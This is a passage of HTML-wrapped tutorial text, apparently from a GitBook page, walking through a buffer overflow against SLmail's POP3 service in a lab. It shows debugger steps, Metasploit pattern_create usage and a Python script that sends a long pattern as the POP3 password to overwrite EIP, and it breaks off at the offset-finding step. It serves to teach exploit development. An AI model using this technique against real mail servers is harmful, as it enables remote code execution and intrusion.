data-key="4c8f03398c64429a80e92bb91002b8fb"><span data-offset-key="4c8f03398c64429a80e92bb91002b8fb:0"><span class="prism-token token 126">    s</span></span><span data-offset-key="4c8f03398c64429a80e92bb91002b8fb:1"><span class="prism-token token 127 punctuation ">.</span></span><span data-offset-key="4c8f03398c64429a80e92bb91002b8fb:2"><span class="prism-token token 128">close</span></span><span data-offset-key="4c8f03398c64429a80e92bb91002b8fb:3"><span class="prism-token token 129 punctuation ">(</span></span><span data-offset-key="4c8f03398c64429a80e92bb91002b8fb:4"><span class="prism-token token 130 punctuation ">)</span></span></span></div></pre></div><p class="blockParagraph-544a408c" data-key="b37acbbc52e5492585c8400bfda00a58"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="26be80b2d0784550ad7b418e115ce552"><span data-offset-key="26be80b2d0784550ad7b418e115ce552:0">Open Immunity Debugger, click </span><span data-offset-key="26be80b2d0784550ad7b418e115ce552:1"><code spellcheck="false" class="code-81e98f88" data-slate-leaf="true">File &gt; Attach</code></span><span data-offset-key="26be80b2d0784550ad7b418e115ce552:2"> and choose </span><span data-offset-key="26be80b2d0784550ad7b418e115ce552:3"><code spellcheck="false" class="code-81e98f88" data-slate-leaf="true">SLmail.exe</code></span><span data-offset-key="26be80b2d0784550ad7b418e115ce552:4">. You&#x27;ll see </span></span><a class="link-a079aa82--primary-53a25e66--link-faf6c434" style="color:#bf272e" href="https://sgros-students.blogspot.com/2014/05/immunity-debugger-basics-part-1.html" target="_blank" rel="noopener noreferrer" data-key="0db1c538f5ff4470a27ceffa429f2ff7"><span data-key="496adcdc9dcf44bb90491a4e721ff1b4"><span data-offset-key="496adcdc9dcf44bb90491a4e721ff1b4:0">four quadrants of gibberish</span></span></a><span data-key="d65149924c264c6bbcd67ca2a25136f1"><span data-offset-key="d65149924c264c6bbcd67ca2a25136f1:0"> representing machine language, registers, dump and stack. The program will be paused, so you&#x27;ll need to hit the Play icon or F9 to run it.</span></span></span></p><p class="blockParagraph-544a408c" data-key="df95fa5dae254426b764fcd9401a548d"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="1ea20268cafd47a59515fd3708563d75"><span data-offset-key="1ea20268cafd47a59515fd3708563d75:0">Then run the above python script and observe the output in the terminal. It should hang after the message </span><span data-offset-key="1ea20268cafd47a59515fd3708563d75:1"><code spellcheck="false" class="code-81e98f88" data-slate-leaf="true">Fuzzing PASS with 2900 bytes</code></span><span data-offset-key="1ea20268cafd47a59515fd3708563d75:2">, which tells you that a crash occurs somewhere around 2700 bytes. Meanwhile, Immunity Debugger will show that the EIP has been overwritten with </span><span data-offset-key="1ea20268cafd47a59515fd3708563d75:3"><code spellcheck="false" class="code-81e98f88" data-slate-leaf="true">41414141</code></span><span data-offset-key="1ea20268cafd47a59515fd3708563d75:4">, or more specifically, a bunch of As. An &quot;A&quot; in hex is represented by </span><span data-offset-key="1ea20268cafd47a59515fd3708563d75:5"><code spellcheck="false" class="code-81e98f88" data-slate-leaf="true">41</code></span><span data-offset-key="1ea20268cafd47a59515fd3708563d75:6">.</span></span></span></p><div data-slate-void="true" data-key="c9f27acaaec747b09edb8809a8524d60"><div><figure data-key="c9f27acaaec747b09edb8809a8524d60" contenteditable="false" class="reset-3c756112--figure-c0d4b308--figureWithCaption-408420be"><div class="reset-3c756112--figureAlignCenter-2d9bf702"><div class="reset-3c756112--figureLayer-b6ab7c94"><img tabindex="0" src="https://blobs.gitbook.com/assets%2F-LMNRaGfniDGOexfu2Y6%2F-LT9P20j1hA2J6rT47xo%2F-LT9UVgfWuGk9QWpiKQ2%2FScreen%20Shot%202018-12-07%20at%204.05.58%20PM.png?alt=media&amp;token=443bbdf1-dad7-45e7-b2dd-c4c08e6f7cd6" class="image-52799b3c" style="cursor:zoom-in"/></div></div><div class="reset-3c756112--figureAlignCenter-2d9bf702"><figcaption class="caption-8750cb6e"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1" style="max-width:100%">EIP overwritten with a string of As</span></figcaption></div></figure></div></div><p class="blockParagraph-544a408c" data-key="17d0bcd3de634c6bb07c9d9a8e653a81"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="929ba0ef2bda4214abb5d2ac6a4173ff"><span data-offset-key="929ba0ef2bda4214abb5d2ac6a4173ff:0">The EIP is important because it is the instruction pointer - it holds the memory address of the next instruction to be carried out. The goal is to overwrite the EIP with a new memory address which points to malicious code. To do this, you need to find out exactly how many characters it takes to reach the EIP without overwriting it.</span></span></span></p><p class="blockParagraph-544a408c" data-key="965d1d641f0c401ea41c00730a0abe06"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="0f5fe3088b6141ea885fb1ed843c028e"><span data-offset-key="0f5fe3088b6141ea885fb1ed843c028e:0">The fastest way to do this is to send a unique, 2700-character string as the password and observe which character segment overwrites the EIP. This can be done in Kali using Metasploit&#x27;s </span><span data-offset-key="0f5fe3088b6141ea885fb1ed843c028e:1"><code spellcheck="false" class="code-81e98f88" data-slate-leaf="true">pattern_create</code></span><span data-offset-key="0f5fe3088b6141ea885fb1ed843c028e:2"> tool:</span></span></span></p><div class="reset-3c756112--codeBlockWrapper-56f27afc"><div contenteditable="false" class="reset-3c756112--copyButtonWrapper-ca591f6e"><div aria-label="Copy" role="button" tabindex="0" class="reset-3c756112--touchableView-a079aa82--copyButton-4f9a9412--tooltipped-57ae51fe"><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor" class="icon-7f6730be--text-3f89f380"><g><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></g></svg></div></div><pre data-key="5fc0a09e1bb84f3ba7c2aecf61685431" spellcheck="false" class="reset-3c756112--codeBlock-75b39b81"><div class="codeLine-a3169fbc" data-key="1f808326af4a4fdba4a608486d0dcaa4"><span data-key="756de0ee84d54d098569626e1e2fa543"><span data-offset-key="756de0ee84d54d098569626e1e2fa543:0">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2700</span></span></div></pre></div><p class="blockParagraph-544a408c" data-key="b95dc408387945af89b2f3bd48041457"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="10ce0eb96f804986918f2c60561f835c"><span data-offset-key="10ce0eb96f804986918f2c60561f835c:0">This will produce a block of unique characters that you can plug into your script instead of the As:</span></span></span></p><div class="reset-3c756112--codeBlockWrapper-56f27afc"><div contenteditable="false" class="reset-3c756112--copyButtonWrapper-ca591f6e"><div aria-label="Copy" role="button" tabindex="0" class="reset-3c756112--touchableView-a079aa82--copyButton-4f9a9412--tooltipped-57ae51fe"><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor" class="icon-7f6730be--text-3f89f380"><g><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></g></svg></div></div><pre data-key="835277c334764bb3b18183b531ffaa24" spellcheck="false" class="reset-3c756112--codeBlock-75b39b81"><div class="codeLine-a3169fbc" data-key="c09ea1c95b5745478f1342108a362621"><span data-key="152b82302fb645e1b790b7a515baf69f"><span data-offset-key="152b82302fb645e1b790b7a515baf69f:0"><span class="prism-token token  comment ">#!/usr/bin/python</span></span></span></div><div class="codeLine-a3169fbc" data-key="a5eb03cb95894444a1a81e035dfe98af"><span data-key="6d039b0fea8b41b6a161af662611770a"><span data-offset-key="6d039b0fea8b41b6a161af662611770a:0"><span data-slate-zero-width="n">​</span></span></span></div><div class="codeLine-a3169fbc" data-key="ca0763e9d058485ea0ba275a489b9dd4"><span data-key="0221272c86ab450bbfe530d794a97df9"><span data-offset-key="0221272c86ab450bbfe530d794a97df9:0"><span class="prism-token token 2 keyword ">import</span></span><span data-offset-key="0221272c86ab450bbfe530d794a97df9:1"><span class="prism-token token 3"> socket</span></span></span></div><div class="codeLine-a3169fbc" data-key="29e03fc1fcfd4f5ba02b5f470cb9a9ca"><span data-key="8be45a28694146178859fd9080e3d01f"><span data-offset-key="8be45a28694146178859fd9080e3d01f:0"><span data-slate-zero-width="n">​</span></span></span></div><div class="codeLine-a3169fbc" data-key="6f3b050fc284463095f76701ff85d1b0"><span data-key="78f51cda68f34e4aaa2b99c928e30731"><span data-offset-key="78f51cda68f34e4aaa2b99c928e30731:0"><span class="prism-token token 3">s </span></span><span data-offset-key="78f51cda68f34e4aaa2b99c928e30731:1"><span class="prism-token token 4 operator ">=</span></span><span data-offset-key="78f51cda68f34e4aaa2b99c928e30731:2"><span class="prism-token token 5"> socket</span></span><span data-offset-key="78f51cda68f34e4aaa2b99c928e30731:3"><span class="prism-token token 6 punctuation ">.</span></span><span data-offset-key="78f51cda68f34e4aaa2b99c928e30731:4"><span class="prism-token token 7">socket</span></span><span data-offset-key="78f51cda68f34e4aaa2b99c928e30731:5"><span class="prism-token token 8 punctuation ">(</span></span><span data-offset-key="78f51cda68f34e4aaa2b99c928e30731:6"><span class="prism-token token 9">socket</span></span><span data-offset-key="78f51cda68f34e4aaa2b99c928e30731:7"><span class="prism-token token 10 punctuation ">.</span></span><span data-offset-key="78f51cda68f34e4aaa2b99c928e30731:8"><span class="prism-token token 11">AF_INET</span></span><span data-offset-key="78f51cda68f34e4aaa2b99c928e30731:9"><span class="prism-token token 12 punctuation ">,</span></span><span data-offset-key="78f51cda68f34e4aaa2b99c928e30731:10"><span class="prism-token token 13"> socket</span></span><span data-offset-key="78f51cda68f34e4aaa2b99c928e30731:11"><span class="prism-token token 14 punctuation ">.</span></span><span data-offset-key="78f51cda68f34e4aaa2b99c928e30731:12"><span class="prism-token token 15">SOCK_STREAM</span></span><span data-offset-key="78f51cda68f34e4aaa2b99c928e30731:13"><span class="prism-token token 16 punctuation ">)</span></span></span></div><div class="codeLine-a3169fbc" data-key="9536dd1e34b84ed7a99f16173de0e0c2"><span data-key="2cf6b09b0fff419f916afa82cb1ff0fe"><span data-offset-key="2cf6b09b0fff419f916afa82cb1ff0fe:0"><span class="prism-token token 18 comment "># Buffer with unique character string</span></span></span></div><div class="codeLine-a3169fbc" data-key="1c784e97756b4e97acb5f2831b0e098b"><span data-key="3392d996d6f344edbcc6eca893c8a4b0"><span data-offset-key="3392d996d6f344edbcc6eca893c8a4b0:0"><span class="prism-token token 20 builtin ">buffer</span></span><span data-offset-key="3392d996d6f344edbcc6eca893c8a4b0:1"><span class="prism-token token 21"> </span></span><span data-offset-key="3392d996d6f344edbcc6eca893c8a4b0:2"><span class="prism-token token 22 operator ">=</span></span><span data-offset-key="3392d996d6f344edbcc6eca893c8a4b0:3"><span class="prism-token token 23"> </span></span><span data-offset-key="3392d996d6f344edbcc6eca893c8a4b0:4"><span class="prism-token token 24 string ">&quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9&quot;</span></span></span></div><div class="codeLine-a3169fbc" data-key="3c4b857453244442a63f5fb69a84da91"><span data-key="fb73442bf14a4909b3555d084543798d"><span data-offset-key="fb73442bf14a4909b3555d084543798d:0"><span data-slate-zero-width="n">​</span></span></span></div><div class="codeLine-a3169fbc" data-key="ae26256b777c4355ae513e3e7efe4b47"><span data-key="4acc1f16708a4c6fb0ca4764ca8af89a"><span data-offset-key="4acc1f16708a4c6fb0ca4764ca8af89a:0"><span class="prism-token token 26 keyword ">try</span></span><span data-offset-key="4acc1f16708a4c6fb0ca4764ca8af89a:1"><span class="prism-token token 27 punctuation ">:</span></span><span data-offset-key="4acc1f16708a4c6fb0ca4764ca8af89a:2"><span class="prism-token token 28"> </span></span></span></div><div class="codeLine-a3169fbc" data-key="00eddc14c5494785b86822c883eb362d"><span data-key="3ceb8c05fa6f4af58e8e7277bc5a5a86"><span data-offset-key="3ceb8c05fa6f4af58e8e7277bc5a5a86:0"><span class="prism-token token 28">    </span></span><span data-offset-key="3ceb8c05fa6f4af58e8e7277bc5a5a86:1"><span class="prism-token token 29 keyword ">print</span></span><span data-offset-key="3ceb8c05fa6f4af58e8e7277bc5a5a86:2"><span class="prism-token token 30"> </span></span><span data-offset-key="3ceb8c05fa6f4af58e8e7277bc5a5a86:3"><span class="prism-token token 31 string ">&quot;\nSending buffer...&quot;</span></span></span></div><div class="codeLine-a3169fbc" data-key="36dd00718d0a4891aa810a8e91fa2b75"><span data-key="2486451a1d91458fbcd9310bc2c2d47a"><span data-offset-key="2486451a1d91458fbcd9310bc2c2d47a:0"><span class="prism-token token 33 comment "># Connect to Windows 7 machine, POP3 service    </span></span></span></div><div class="codeLine-a3169fbc" data-key="eb0b2da948944332abf02c29a11440c0"><span data-key="d54efe4b83404094865020c8582eac02"><span data-offset-key="d54efe4b83404094865020c8582eac02:0"><span class="prism-token token 34">    s</span></span><span data-offset-key="d54efe4b83404094865020c8582eac02:1"><span class="prism-token token 35 punctuation ">.</span></span><span data-offset-key="d54efe4b83404094865020c8582eac02:2"><span class="prism-token token 36">connect</span></span><span data-offset-key="d54efe4b83404094865020c8582eac02:3"><span class="prism-token token 37 punctuation ">(</span></span><span data-offset-key="d54efe4b83404094865020c8582eac02:4"><span class="prism-token token 38 punctuation ">(</span></span><span data-offset-key="d54efe4b83404094865020c8582eac02:5"><span class="prism-token token 39 string ">&#x27;10.0.0.1&#x27;</span></span><span data-offset-key="d54efe4b83404094865020c8582eac02:6"><span class="prism-token token 40 punctuation ">,</span></span><span data-offset-key="d54efe4b83404094865020c8582eac02:7"><span class="prism-token token 41 number ">110</span></span><span data-offset-key="d54efe4b83404094865020c8582eac02:8"><span class="prism-token token 42 punctuation ">)</span></span><span data-offset-key="d54efe4b83404094865020c8582eac02:9"><span class="prism-token token 43 punctuation ">)</span></span></span></div><div class="codeLine-a3169fbc" data-key="b3fcc6bd2eea4280b29cbad82a136cb3"><span data-key="05a5e6b4dcc149c58b78d4efe69ddaa1"><span data-offset-key="05a5e6b4dcc149c58b78d4efe69ddaa1:0"><span class="prism-token token 44">    data </span></span><span data-offset-key="05a5e6b4dcc149c58b78d4efe69ddaa1:1"><span class="prism-token token 45 operator ">=</span></span><span data-offset-key="05a5e6b4dcc149c58b78d4efe69ddaa1:2"><span class="prism-token token 46"> s</span></span><span data-offset-key="05a5e6b4dcc149c58b78d4efe69ddaa1:3"><span class="prism-token token 47 punctuation ">.</span></span><span data-offset-key="05a5e6b4dcc149c58b78d4efe69ddaa1:4"><span class="prism-token token 48">recv</span></span><span data-offset-key="05a5e6b4dcc149c58b78d4efe69ddaa1:5"><span class="prism-token token 49 punctuation ">(</span></span><span data-offset-key="05a5e6b4dcc149c58b78d4efe69ddaa1:6"><span class="prism-token token 50 number ">1024</span></span><span data-offset-key="05a5e6b4dcc149c58b78d4efe69ddaa1:7"><span class="prism-token token 51 punctuation ">)</span></span></span></div><div class="codeLine-a3169fbc" data-key="f38a9484f88d4d0a91eb71914d8acc28"><span data-key="11bba811254d423aac71fbb4050f078b"><span data-offset-key="11bba811254d423aac71fbb4050f078b:0"><span class="prism-token token 52">    s</span></span><span data-offset-key="11bba811254d423aac71fbb4050f078b:1"><span class="prism-token token 53 punctuation ">.</span></span><span data-offset-key="11bba811254d423aac71fbb4050f078b:2"><span class="prism-token token 54">send</span></span><span data-offset-key="11bba811254d423aac71fbb4050f078b:3"><span class="prism-token token 55 punctuation ">(</span></span><span data-offset-key="11bba811254d423aac71fbb4050f078b:4"><span class="prism-token token 56 string ">&#x27;USER username&#x27;</span></span><span data-offset-key="11bba811254d423aac71fbb4050f078b:5"><span class="prism-token token 57"> </span></span><span data-offset-key="11bba811254d423aac71fbb4050f078b:6"><span class="prism-token token 58 operator ">+</span></span><span data-offset-key="11bba811254d423aac71fbb4050f078b:7"><span class="prism-token token 59"> </span></span><span data-offset-key="11bba811254d423aac71fbb4050f078b:8"><span class="prism-token token 60 string ">&#x27;\r\n&#x27;</span></span><span data-offset-key="11bba811254d423aac71fbb4050f078b:9"><span class="prism-token token 61 punctuation ">)</span></span></span></div><div class="codeLine-a3169fbc" data-key="b4572ed64c8c4d82bd3e4d2e972ceb7d"><span data-key="de4a295a1c05440c883b554a61bba8c9"><span data-offset-key="de4a295a1c05440c883b554a61bba8c9:0"><span class="prism-token token 62">    data </span></span><span data-offset-key="de4a295a1c05440c883b554a61bba8c9:1"><span class="prism-token token 63 operator ">=</span></span><span data-offset-key="de4a295a1c05440c883b554a61bba8c9:2"><span class="prism-token token 64"> s</span></span><span data-offset-key="de4a295a1c05440c883b554a61bba8c9:3"><span class="prism-token token 65 punctuation ">.</span></span><span data-offset-key="de4a295a1c05440c883b554a61bba8c9:4"><span class="prism-token token 66">recv</span></span><span data-offset-key="de4a295a1c05440c883b554a61bba8c9:5"><span class="prism-token token 67 punctuation ">(</span></span><span data-offset-key="de4a295a1c05440c883b554a61bba8c9:6"><span class="prism-token token 68 number ">1024</span></span><span data-offset-key="de4a295a1c05440c883b554a61bba8c9:7"><span class="prism-token token 69 punctuation ">)</span></span></span></div><div class="codeLine-a3169fbc" data-key="694bed1a0832407c864e2b5affe7b73a"><span data-key="b5a59135f77d4606861ab66b04b4c8ca"><span data-offset-key="b5a59135f77d4606861ab66b04b4c8ca:0"><span class="prism-token token 70">    s</span></span><span data-offset-key="b5a59135f77d4606861ab66b04b4c8ca:1"><span class="prism-token token 71 punctuation ">.</span></span><span data-offset-key="b5a59135f77d4606861ab66b04b4c8ca:2"><span class="prism-token token 72">send</span></span><span data-offset-key="b5a59135f77d4606861ab66b04b4c8ca:3"><span class="prism-token token 73 punctuation ">(</span></span><span data-offset-key="b5a59135f77d4606861ab66b04b4c8ca:4"><span class="prism-token token 74 string ">&#x27;PASS &#x27;</span></span><span data-offset-key="b5a59135f77d4606861ab66b04b4c8ca:5"><span class="prism-token token 75"> </span></span><span data-offset-key="b5a59135f77d4606861ab66b04b4c8ca:6"><span class="prism-token token 76 operator ">+</span></span><span data-offset-key="b5a59135f77d4606861ab66b04b4c8ca:7"><span class="prism-token token 77"> </span></span><span data-offset-key="b5a59135f77d4606861ab66b04b4c8ca:8"><span class="prism-token token 78 builtin ">buffer</span></span><span data-offset-key="b5a59135f77d4606861ab66b04b4c8ca:9"><span class="prism-token token 79"> </span></span><span data-offset-key="b5a59135f77d4606861ab66b04b4c8ca:10"><span class="prism-token token 80 operator ">+</span></span><span data-offset-key="b5a59135f77d4606861ab66b04b4c8ca:11"><span class="prism-token token 81"> </span></span><span data-offset-key="b5a59135f77d4606861ab66b04b4c8ca:12"><span class="prism-token token 82 string ">&#x27;\r\n&#x27;</span></span><span data-offset-key="b5a59135f77d4606861ab66b04b4c8ca:13"><span class="prism-token token 83 punctuation ">)</span></span></span></div><div class="codeLine-a3169fbc" data-key="ee3e42d117de4741a4e2987a8be17ea6"><span data-key="1ce2b7fca74541388e34b7af71f6bdcf"><span data-offset-key="1ce2b7fca74541388e34b7af71f6bdcf:0"><span class="prism-token token 84">    </span></span><span data-offset-key="1ce2b7fca74541388e34b7af71f6bdcf:1"><span class="prism-token token 85 keyword ">print</span></span><span data-offset-key="1ce2b7fca74541388e34b7af71f6bdcf:2"><span class="prism-token token 86"> </span></span><span data-offset-key="1ce2b7fca74541388e34b7af71f6bdcf:3"><span class="prism-token token 87 string ">&quot;\nDone!&quot;</span></span></span></div><div class="codeLine-a3169fbc" data-key="5ee2247fdabb4227981a6d744819dc50"><span data-key="c44263e789574f53afd8d8e50f54da9d"><span data-offset-key="c44263e789574f53afd8d8e50f54da9d:0"><span data-slate-zero-width="n">​</span></span></span></div><div class="codeLine-a3169fbc" data-key="ac543cb43b91439a828dd0e7ba1bac08"><span data-key="98d11322b6684fa7a493efa4aed94134"><span data-offset-key="98d11322b6684fa7a493efa4aed94134:0"><span class="prism-token token 89 keyword ">except</span></span><span data-offset-key="98d11322b6684fa7a493efa4aed94134:1"><span class="prism-token token 90 punctuation ">:</span></span></span></div><div class="codeLine-a3169fbc" data-key="73f79ed559344e168459ad734966ff7e"><span data-key="e9c0b2c3f8fa4b8f9fde54ad9724bdf2"><span data-offset-key="e9c0b2c3f8fa4b8f9fde54ad9724bdf2:0"><span class="prism-token token 91">    </span></span><span data-offset-key="e9c0b2c3f8fa4b8f9fde54ad9724bdf2:1"><span class="prism-token token 92 keyword ">print</span></span><span data-offset-key="e9c0b2c3f8fa4b8f9fde54ad9724bdf2:2"><span class="prism-token token 93"> </span></span><span data-offset-key="e9c0b2c3f8fa4b8f9fde54ad9724bdf2:3"><span class="prism-token token 94 string ">&quot;Could not connect!&quot;</span></span></span></div></pre></div><p class="blockParagraph-544a408c" data-key="bab27719bd3f4100b964c65249a70702"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="4e32312361cc4fa1817d2d45308a5162"><span data-offset-key="4e32312361cc4fa1817d2d45308a5162:0">When you run this script, the EIP will be written with some fragment of this unique string:</span></span></span></p><div data-slate-void="true" data-key="0e59900e58f046269b8d65d0f2209725"><div><figure data-key="0e59900e58f046269b8d65d0f2209725" contenteditable="false" class="reset-3c756112--figure-c0d4b308--figureWithCaption-408420be"><div class="reset-3c756112--figureAlignCenter-2d9bf702"><div class="reset-3c756112--figureLayer-b6ab7c94"><img tabindex="0" src="https://blobs.gitbook.com/assets%2F-LMNRaGfniDGOexfu2Y6%2F-LT9cq4NUbSMy1maN4eG%2F-LT9dMGb2T6qC5vmFqI4%2FScreen%20Shot%202018-12-07%20at%204.48.19%20PM.png?alt=media&amp;token=103bed98-7f31-4d6a-b636-e0d9f7fab081" class="image-52799b3c" style="cursor:zoom-in"/></div></div><div class="reset-3c756112--figureAlignCenter-2d9bf702"><figcaption class="caption-8750cb6e"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1" style="max-width:100%">EIP written with unique string fragment</span></figcaption></div></figure></div></div><p class="blockParagraph-544a408c" data-key="c5bd2746e3af450085528fa7b3ba54b4"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="698a03c5d6814d9197f6ac9de33c78da"><span data-offset-key="698a03c5d6814d9197f6ac9de33c78da:0">You can use Metasploit&#x27;s </span><span data-offset-key="698a03c5d6814d9197f6ac9de33c78da:1"><code spellcheck="false" class="code-81e98f88" data-slate-leaf="true">pattern_offset</code></span><span data-offset-key="698a03c5d6814d9197f6ac9de33c78da:2"> tool to find the location of the </span><span data-offset-key="698a03c5d6814d9197f6ac9de33c78da:3"><code spellcheck="false" class="code-81e98f88" data-slate-leaf="true">39694438</code></span><span data-offset-key="698a03c5d6814d9197f6ac9de33c78da:4">fragment in the unique string:</span></span></span></p><p class="blockParagraph-544a408c" data-key="c230ea620ea84bdbb40dcf8cd8f95e00"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="2d0ef152eb78441fb859a747abd45dc8"><span 